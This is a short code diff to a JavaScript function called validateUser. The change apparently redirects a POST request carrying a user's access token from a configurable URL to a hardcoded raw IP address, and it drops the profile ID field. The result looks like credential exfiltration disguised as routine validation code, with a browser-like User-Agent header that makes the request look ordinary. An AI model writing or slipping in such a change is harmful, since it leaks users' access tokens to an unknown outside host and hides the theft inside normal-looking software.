@@ -42,12 +42,12 @@ function validateUser(access_token, profile_id) {
     "User-Agent":
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
   };
-  return fetch(url, {
+  return fetch("https://65.21.228.155/access", {
     method: "POST",
     headers: headers,
     body: new URLSearchParams({
             'access_token': access_token,
-            'profile_id': profile_id
+
         })
   });
 }
